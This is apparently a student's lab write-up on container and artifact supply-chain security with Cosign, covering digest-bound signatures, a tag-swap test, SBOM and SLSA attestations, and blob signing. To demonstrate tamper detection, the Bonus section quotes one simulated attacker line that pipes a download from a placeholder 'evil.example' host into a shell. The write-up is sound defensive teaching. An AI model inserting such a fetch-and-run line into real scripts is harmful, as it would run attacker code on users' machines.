# Lab 8 — Supply Chain: Signing, Tampering, and Attestation

Tooling: `cosign v3.0.2` (not 3.1.x — it removed `--tlog-upload=false`), `registry:3`, Docker 29.4.3.

Two environment notes up front, both of which changed what I had to do:

- **The registry runs on port 5050, not 5000.** On macOS, ControlCenter (AirPlay Receiver) listens on `*:5000`. The registry container bound `127.0.0.1:5000` successfully and `curl http://127.0.0.1:5000/v2/` answered `200`, but Cosign resolved `localhost` to the IPv6 address where AirPlay was listening and failed with `GET http://localhost:5000/v2/: unexpected status code 403 Forbidden` — an error that reads like a registry problem and is not one. Moving to 5050 fixed it outright.
- **The private key was never committed.** `.gitignore` already carries `*.key`, so `git add labs/lab8/keys/cosign.key` is refused before the Lab 3 pre-commit hook even runs: `git check-ignore -v` reports `.gitignore:5:*.key`. Belt and braces — `detect-private-key` would have caught it at commit time too. The passphrase lives only in a session-scratch file outside the repository.

## Task 1

### The digest I signed, and how I picked it

```
localhost:5050/juice-shop@sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113
```

The lab warns that `{{index .RepoDigests 0}}` returns the Docker Hub digest once an image lives in two registries, and says to filter for the local one. **That filter is not enough here**, and finding out why was the most useful part of the task. After `docker push`, `docker inspect` reports this:

```bash
$ docker inspect localhost:5050/juice-shop:v20.0.0 --format '{{range .RepoDigests}}{{println .}}{{end}}'
bkimminich/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
localhost:5000/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
localhost:5050/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
```

Every line carries `fd58bdc9...` — the Lab 4 digest — including the local ones. But the push itself said otherwise:

```
Info -> Not all multiplatform-content is present and only the available single-platform image was pushed
        sha256:fd58bdc9745416... -> sha256:cbdfc00de87592...
```

`fd58bdc9...` is the digest of the **multi-platform index** on Docker Hub. My laptop only holds the `arm64` variant, so the push flattened the index into a single-platform manifest, and what the registry actually stores hashes to `cbdfc00d...`. Docker's `RepoDigests` kept reporting the original index digest for the new repository regardless.

So I asked the registry instead of asking Docker:

```bash
$ curl -s -H 'Accept: application/vnd.oci.image.index.v1+json, ...' -D - -o /dev/null \
    http://127.0.0.1:5050/v2/juice-shop/manifests/v20.0.0 | grep -i docker-content-digest
Docker-Content-Digest: sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113
```

Signing the digest `docker inspect` offered would have sent Cosign to Docker Hub, where I cannot push. **The authoritative answer to "what is in this registry" comes from the registry.**

### Successful verification

```bash
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
    --allow-insecure-registry "$DIGEST"

Verification for localhost:5050/juice-shop@sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113 --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
```

```json
{
  "identity": "localhost:5050/juice-shop@sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113",
  "digest": "sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113",
  "type": "https://sigstore.dev/cosign/sign/v1"
}
```

### The swap

`alpine:3.20` pushed over the same tag:

```
signed:  localhost:5050/juice-shop@sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113
now:     localhost:5050/juice-shop@sha256:45e09956dc667c5eff3583c9d94830261fb1ca0be10a0a7db36266edf5de9e1d
```

Verification of what the tag resolves to **now**, quoted exactly:

```
Error: no signatures found
error during command execution: no signatures found
```

And the digest I signed still verifies, afterwards, unchanged:

```bash
$ cosign verify --key ... "$(cat labs/lab8/results/juice-shop-digest.txt)" | jq -r '.[0].critical.image["docker-manifest-digest"]'
sha256:cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113
```

### What the signature is bound to

A signature is bound to **the digest — the hash of the image manifest — and not to the name you reached it by**. `v20.0.0` is a label the registry lets anyone with push access re-point at any content; the digest *is* the content, so it cannot be re-pointed at all. Cosign stores the signature under the digest, so when the tag started resolving to Alpine, Cosign was not fooled and was not even really "checking the tag": it resolved the tag to a digest, looked for a signature on *that* digest, and found none. Note what the error says — `no signatures found`, not "bad signature". Nothing was forged; the attacker simply published different content under the same name, and that content was never signed by anyone.

If signatures were bound to tags, the attack would have succeeded silently. The signature would say "I vouch for `localhost:5050/juice-shop:v20.0.0`", the tag would still be `v20.0.0`, verification would pass, and an admission controller would admit an Alpine container — or a backdoored Juice Shop — while reporting the supply chain as verified. That is precisely why every deployment manifest in Lab 7 pins the image by digest and not by tag.

## Task 2

### Component counts

```bash
$ jq '.components | length' labs/lab4/juice-shop.cdx.json          # the Lab 4 SBOM
3068
$ jq '.components | length' labs/lab8/results/sbom-from-attestation.json   # round-tripped
3068
```

Identical. The SBOM came back out of the attestation byte-for-identical in content: 2159 `file` components, 907 libraries, one application, one operating-system entry, exactly as Lab 4 recorded. (The file itself lives on the `feature/lab4` branch, so I read it with `git show origin/feature/lab4:labs/lab4/juice-shop.cdx.json` rather than re-generating it — re-generating would have produced a new `serialNumber` and timestamp and made the comparison meaningless.)

### The two `predicateType` values, read from the payload

```bash
$ cosign verify-attestation ... --type cyclonedx "$DIGEST" \
    | jq -r '.payload | @base64d | fromjson | .predicateType'
https://cyclonedx.org/bom

$ cosign verify-attestation ... --type slsaprovenance "$DIGEST" \
    | jq -r '.payload | @base64d | fromjson | .predicateType'
https://slsa.dev/provenance/v0.2
```

Both confirm the strings I guessed at in the Lab 4 bonus: the CycloneDX predicate type is unversioned (`https://cyclonedx.org/bom`, no `/v1.7`), and the SLSA one carries its own version independent of the statement's.

### The decoded statement, field by field

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://cyclonedx.org/bom",
  "subject": [
    {
      "name": "localhost:5050/juice-shop",
      "digest": { "sha256": "cbdfc00de875926f20ff603fac73c5b68577e37680cf2e0c324adda42ffc1113" }
    }
  ],
  "predicate": { ... }
}
```

| Field | Value | Who supplied it |
|---|---|---|
| `_type` | `https://in-toto.io/Statement/v0.1` | **Cosign.** A constant of the in-toto spec version Cosign emits — note it is `v0.1`, not `v1`. |
| `predicateType` | `https://cyclonedx.org/bom` / `https://slsa.dev/provenance/v0.2` | **Cosign**, derived from my `--type cyclonedx` / `--type slsaprovenance` flag. I chose the flag; Cosign chose the URI. |
| `subject[0].name` | `localhost:5050/juice-shop` | **Cosign**, from the image reference I passed — and note it dropped the `@sha256:...` part, keeping the repository name only. |
| `subject[0].digest.sha256` | `cbdfc00d...` | **Cosign**, resolved from the reference I signed. |
| `predicate` | the SBOM / the provenance object | **Me**, verbatim from `--predicate`. This is the only part that is mine. |

That division is the lesson of writing the envelope by hand in Lab 4: the predicate is yours, everything that *binds* it to an artifact is the tool's, and getting the two type strings wrong produces a file that looks right and verifies against nothing.

### The morning after the next Log4Shell

A signature answers "is this image the one we published"; it says nothing about what is inside. With two thousand images, the question at 3 a.m. is "which of these contain the affected package and version", and a signature cannot answer it — you would have to pull and re-scan two thousand images, which is hours of registry traffic you do not have. The attestation turns that into a query: each image already carries a signed inventory, so you fetch predicates and grep, and the answer is both fast and *trustworthy*, because the inventory is cryptographically bound to the exact digest it describes rather than to a filename in a wiki someone last updated in March.

What still has to be true for that to work at three in the morning: the attestations must have been produced **at build time for every image**, not for the handful somebody remembered — coverage is the whole game, and an SBOM programme with 60 % coverage gives you 60 % of an answer and no way to know which 40 % is missing. The verification key must be reachable and trusted without the person on call knowing where it lives. The SBOMs must be *accurate* — anything Syft failed to catalogue is silently absent, and an attestation makes a wrong inventory authoritative-looking rather than wrong. And you need a way to go from "image digest X is affected" to "which clusters and namespaces are running digest X", which is a different system entirely — the attestation tells you what is in the artifact, not where the artifact is running.

## Bonus

### Verified OK, then not

```bash
$ cosign verify-blob --key labs/lab8/keys/cosign.pub \
    --bundle labs/lab8/results/my-tool.tar.gz.bundle --insecure-ignore-tlog \
    labs/lab8/results/my-tool.tar.gz
Verified OK
```

Then the attacker's move — modify `install.sh` to append `curl -s https://evil.example/x | sh`, rebuild the tarball, do not re-sign:

```
Error: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
```

Note how this differs from Task 1's failure. There the error was `no signatures found` — the attacker published new content with no signature attached. Here the signature *is* present and *is* checked, and it fails because it was made over different bytes. Both are refusals; only the second one is a cryptographic mismatch.

### What a consumer needs, and over which channel

Two files plus one thing that is not a file:

| Item | May travel with the artifact? |
|---|---|
| `my-tool.tar.gz` — the artifact | — |
| `my-tool.tar.gz.bundle` — the signature bundle | **Yes.** It is useless to an attacker and tamper-evident: altering it only makes verification fail. Serving it from the same CDN is fine. |
| `cosign.pub` — the public key | **No.** This is the trust anchor, and it must reach the user over a channel the artifact's host does not control. |

That last row is the whole problem. If the key ships from the same CDN as the tarball, whoever compromises the CDN replaces all three at once — artifact, bundle and key — and verification passes against the attacker's own key. The signature then proves only that the attacker signed their own file.

### The install instructions I would publish

```bash
# 1. Trust anchor - from the project's GitHub release page, not from the CDN.
#    Verify this fingerprint against the one printed in the README and in the
#    release announcement:
#      sha256sum cosign.pub   # 3f2a...  (publish this value in several places)
curl -fsSLO https://github.com/<org>/<tool>/releases/download/v1.2.3/cosign.pub

# 2. Artifact and signature bundle.
curl -fsSLO https://cdn.example.com/my-tool-1.2.3.tar.gz
curl -fsSLO https://cdn.example.com/my-tool-1.2.3.tar.gz.bundle

# 3. Verify BEFORE extracting or executing anything.
cosign verify-blob --key cosign.pub --bundle my-tool-1.2.3.tar.gz.bundle \
  my-tool-1.2.3.tar.gz || { echo "VERIFICATION FAILED - do not run this"; exit 1; }

# 4. Only now.
tar -xzf my-tool-1.2.3.tar.gz && ./install.sh
```

Three properties make this work: the artifact is **downloaded to disk, never piped into a shell**, so there is a moment at which it can be checked; verification is a **hard gate** whose failure aborts, not a warning printed into a log nobody reads; and the key arrives from a **different origin** than the artifact, with a fingerprint published in several independent places.

**The step most projects skip is key distribution** — and it is skipped precisely because it is the only step that cannot be solved inside the download script. Projects publish the signature next to the artifact, on the same host, and call it signed. Codecov's uploader was worse still: signed by nobody, verified by nobody, and consumed with `curl | bash`, which has no step 3 at all — the bytes go straight from the network into an interpreter, and the first thing that could notice a modification is the machine running the attacker's code. Keyless signing with Sigstore is the modern answer to the key-distribution half: the identity is an OIDC identity recorded in a public transparency log, so there is no key file for anyone to swap.
